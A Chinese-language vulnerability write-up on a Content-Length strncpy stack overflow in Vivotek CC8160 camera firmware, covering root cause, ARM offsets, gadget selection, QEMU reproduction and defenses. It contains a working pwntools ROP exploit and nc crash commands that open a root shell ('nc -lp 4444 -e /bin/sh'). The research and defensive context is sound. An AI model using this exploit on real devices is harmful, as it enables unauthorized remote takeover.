---
id: binary-pwn-stack-vivotek-cc8160-upgrade-cgi-content-length-strncpy-arm-rop
title: Vivotek CC8160 httpd upgrade.cgi Content-Length 差值 strncpy 栈溢出：ARM 32 位偏移 52 + pop{r1,pc}/mov r0,r1 调 system 反弹 shell
type: scenario
domain: binary
path: binary/pwn/stack
technique: vivotek-cc8160-content-length-strncpy-arm-rop
tags:
- pwn
- stack-overflow
- arm
- iot
- firmware
- rop
- strncpy
- httpd
- vivotek
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: CC8160-VVTK-0113b
verification:
  verified_by: verifier-V302
  verified_at: '2026-11-08T11:46:03+08:00'
  notes: 已对照原文 content.md 与 24 张图片核对：img02/03 的 strstr(Content-Length)/strchr(10,58)/strncpy(dest,v35+1,v34-(v35+1)) 与 dest[41] 一致；img17 崩溃 R4-R11=BBBB..IIII、PC=XXXX，img18/19 确认偏移 52 与 0x18398 pop 链；img20/21/23 gadget 0x33100 pop{r0,pc}、0x48784 pop{r1,pc}、0x16aa4 mov r0,r1 与 payload 一致；img24 反弹 shell root 成功。affected_versions 已按原文固件名设为 CC8160-VVTK-0113b。与 Tenda AC15 strcpy 卡触发/偏移/gadget 不同，dedup 无 duplicate/likely_duplicate。未验证点：未运行原固件/exp.py，真实设备 ASLR/PIE 状态下地址需重算（文章环境关闭 ASLR）。
url: /docs/binary/pwn/stack/binary-pwn-stack-vivotek-cc8160-upgrade-cgi-content-length-strncpy-arm-rop/
draft: false
kb_aliases:
- Vivotek CC8160 栈溢出
- upgrade.cgi Content-Length 溢出
- strncpy 长度由 strchr 差值决定
- ARM ROP 反弹 shell
- pop r1 pc + mov r0 r1
- boa httpd 栈溢出
- CC8160-VVTK-0113b
---

## 一句话结论

Vivotek CC8160 固件（CC8160-VVTK-0113b，32 位小端 ARM，boa httpd）的 `/cgi-bin/admin/upgrade.cgi` 在处理 POST 头时用 `v33=strstr(haystack,"Content-Length"); v34=strchr(v33,10); v35=strchr(v33,58); strncpy(dest, v35+1, v34-(v35+1));` 把“冒号到换行”之间的可控长度直接当拷贝长度，且不检查 `dest` 大小，导致栈溢出；文章在 QEMU 环境中以 52 字节覆盖到返回地址，用 libc 中 `pop {r1,pc}` + `mov r0,r1`  gadget 把 r0 指向栈上的 `nc -lp 4444 -e /bin/sh;`，再跳到 `system` 获得 root 反弹 shell。

## 原理

- **漏洞点**：`upgrade.cgi` 先把整个 HTTP 请求读入栈上 `haystack`（`read(..., 0x2000)`），若首行是 POST/PUT，则 `strstr` 找到 `Content-Length`，`strchr` 找到换行（0x0A）和冒号（0x3A），然后 `strncpy(dest, v35+1, v34-(v35+1))`。第三个参数是“换行指针 - （冒号+1）”，即 `Content-Length:` 后面到换行前的字节数，完全由攻击者控制，且没有与 `dest` 的大小比较；`dest` 是栈上小缓冲区（IDA 显示 `char dest[41]` 左右，实际到保存寄存器/返回地址的偏移为 52 字节），长度超过即覆盖相邻栈变量、保存的 r4-r11/fp/lr 和返回地址。
- **触发形态**：请求行可用 `POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:` 后直接跟长串填充和地址字节（文章用 `\n` 而非 `\r\n`，`Content-Length` 的值就是溢出数据），最后跟 `\r\n\r\n` 与命令字符串；`strncpy` 不遇到 NUL 就一直拷贝，直到长度用完，因此可以把完整 ROP 链写进栈。
- **ARM 32 位栈布局**：崩溃时寄存器反映填充模式：`R4=0x42424242('BBBB')`、`R5='CCCC'` … `R11='IIII'`、`PC=0x58585858('XXXX')`，说明从 `dest` 到 PC 的偏移为 52 字节（20 个 A + B/C/D/E/F/G/H/I 各 4 字节 = 52，再 4 字节 X 落到 PC）。因此 payload 用 `b'b'*(0x3c-8)`（52 字节）填到返回地址。
- **为什么选 `pop {r1,pc}` + `mov r0,r1`**：ARM 调用约定前 4 个参数在 r0-r3，`system(cmd)` 需要 r0 指向命令串。libc 里有 `pop {r0,pc}`（libc_base+0x33100），但该地址加基址后末字节为 `\x00`，经 `strncpy`/字符串处理会在 NUL 处截断，payload 无法完整送达；改用 `pop {r1,pc}`（libc_base+0x48784）先把栈上的命令地址弹入 r1，再跳到 `mov r0,r1; pop {r4,r5,pc}`（libc_base+0x16aa4），把 r1 移到 r0 并跳过 8 字节垃圾后跳到 `system`。链形态：
  `[52 字节填充][pop_r1][cmd_addr][mov_r0_r1][8 字节垃圾][system][cmd...]`。
- **地址前提**：文章环境关闭 ASLR，libc 基址固定为 `0xb6f2d000`，栈上请求缓冲区地址固定为 `0xbeffeb64`（命令串起点）；`system` 取 `libc.sym['system']`。真实设备若开启 ASLR/不同固件版本，需要先泄露 libc/栈地址或换用固定地址 gadget。
- **影响**：未认证（文章 PoC 未带凭据）向 httpd 的 upgrade.cgi 发送一个 POST 即可造成栈溢出并执行任意命令，获得 root shell；属于远程代码执行/设备完全失陷。

## 触发条件

- 目标为 Vivotek CC8160 固件 `CC8160-VVTK-0113b`（或同一漏洞代码的其他版本），httpd 为 boa（文章环境 Boa/0.94.14rc21），`/cgi-bin/admin/upgrade.cgi` 可访问。
- 攻击者能向 80 端口发送 POST/PUT 请求，且请求体/头部可包含超长 `Content-Length` 值（无需 NUL；可含任意非换行字节）。
- 目标未开启 ASLR，或攻击者已知 libc 基址与栈地址；否则需要先信息泄露/暴力猜测。
- 文章 QEMU 复现环境：qemu-arm-static chroot 运行 httpd（修 `boa.conf`/`/etc/hosts`），或 qemu-system-arm + Debian armel 虚拟机 + tap0 网络；gdbserver 附加 httpd 用于确认偏移和 ROP 链。

## 利用步骤

1. 固件提取：`binwalk -Me CC8160-VVTK-0113b.flash.pkg`，定位 `squashfs-root`；确认 `bin/busybox` 为 ELF 32-bit LSB ARM EABI5、uClibc。
2. 环境：复制 `qemu-arm-static` 到 rootfs，`sudo chroot . ./qemu-arm-static ./usr/sbin/httpd`；按报错修 `etc/conf.d/boa/boa.conf`（从 defconfig 的 `CC8160` 包复制 etc）与 `/etc/hosts`（保证 `gethostbyname` 能解析本机名），直到 httpd 监听 80。
3. 验证崩溃：`echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAA...BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n" | nc 目标 80`；httpd 崩溃（日志 `caught SIGSEGV, dumping core in /tmp`）。
4. 调试：gdbserver attach httpd 进程，gdb-multiarch `target remote`；发送带分组填充的请求，观察 `R4=BBBB…R11=IIII、PC=XXXX`，确认从 dest 到 PC 的偏移为 52。
5. 找 gadget：在固件 `lib/libc.so.0` 中找 `pop {r1,pc}`、`mov r0,r1; pop {r4,r5,pc}`、`system`；避开地址中带 `\x00` 的 gadget（如 `pop {r0,pc}`）。
6. 构造 payload：`b'b'*52 + p32(pop_r1) + p32(cmd_addr) + p32(mov_r0_r1) + b'b'*8 + p32(system)`，命令串 `nc -lp 4444 -e /bin/sh;` 放在请求尾部并让 `cmd_addr` 指向它；用 pwn/requests 发送 POST。
7. 在攻击机 `nc 目标 4444` 连接，执行 `whoami` 验证 root；成功后清理/记录。

## PoC

以下为按文章脚本重写的 ARM ROP 利用（未对真实设备运行；地址/偏移需按目标固件与 ASLR 状态调整）。

```python
#!/usr/bin/env python3
from pwn import *
import requests

context.log_level = 'debug'
p = remote('192.168.100.2', 80)

libc = ELF('./lib/libc.so.0')
libc_base = 0xb6f2d000
pop_r1   = libc_base + 0x00048784        # pop {r1, pc}
mov_r0_r1= libc_base + 0x00016aa4        # mov r0, r1; pop {r4, r5, pc}
system   = libc_base + libc.sym['system']
stack    = 0xbeffeb64                    # 命令串在栈上的地址（ASLR off）

head = b"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:"
payload = b'b' * (0x3c - 8)              # 52 字节到返回地址
payload += p32(pop_r1) + p32(stack)
payload += p32(mov_r0_r1) + b'b' * 8
payload += p32(system)
end = b"nc -lp 4444 -e /bin/sh;" + b"\r\n\r\n"

p.sendline(head + payload + end)
```

## 变体与关联

- 变体：若 `strchr(v33,10)` 找不到换行或 `strchr(v33,58)` 找不到冒号，`strncpy` 可能收到 NULL 指针/异常长度，先触发崩溃而非可控溢出；构造时必须包含冒号和换行。
- 变体：若目标开启 ASLR，需要先通过泄露/爆破获得 libc 与栈地址，或改用固件中固定地址的 gadget/系统调用链；也可用 `ret2libc` 以外的方式（如返回 `system` 前用 ROP 写命令到 BSS）。
- 变体：不同固件版本的 `dest` 大小/寄存器保存布局可能变化，偏移需重新用分组填充（AAAA/BBBB…）确定；gadget 偏移也需在对应 `libc.so.0` 中重新搜索。
- 关联：[[binary-pwn-stack-dir505-my-cgi-content-length-overflow-mipseb-rop]]（DIR-505 同类 Content-Length 解析栈溢出，MIPS ROP）、[[binary-pwn-stack-tenda-ac15-setmacfiltercfg-devicelist-strcpy-arm-rop]]（ARM httpd 栈溢出调 system）、[[code-analysis-reverse-firmware-arm32-qemu-user-chroot-patch-br0]]（ARM32 固件 qemu-user chroot 仿真）、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（系统级 QEMU 路由器固件仿真）。

## 检测与防御

- 检测：对 `Content-Length` 等头部值做长度上限与字符集校验；代码审计关注 `strncpy` 第三参来自 `strchr` 差值/用户输入的路径；固件/设备侧可监控 httpd 崩溃（SIGSEGV/core）与异常长头部。
- 防御：升级到修复固件；把 `strncpy` 改为 `strncpy(dest, src, sizeof(dest)-1); dest[sizeof(dest)-1]=0;` 或使用带边界检查的解析器；对 `v34/v35` 做 NULL 与非负长度校验；启用 ASLR/NX/Stack Canary；限制 upgrade.cgi 访问（认证、ACL、仅内网）。
- 说明：本文为真实 IoT 固件漏洞复现（文章在 QEMU 中获得 root shell），severity 记为 high；仅在授权设备/仿真环境测试。
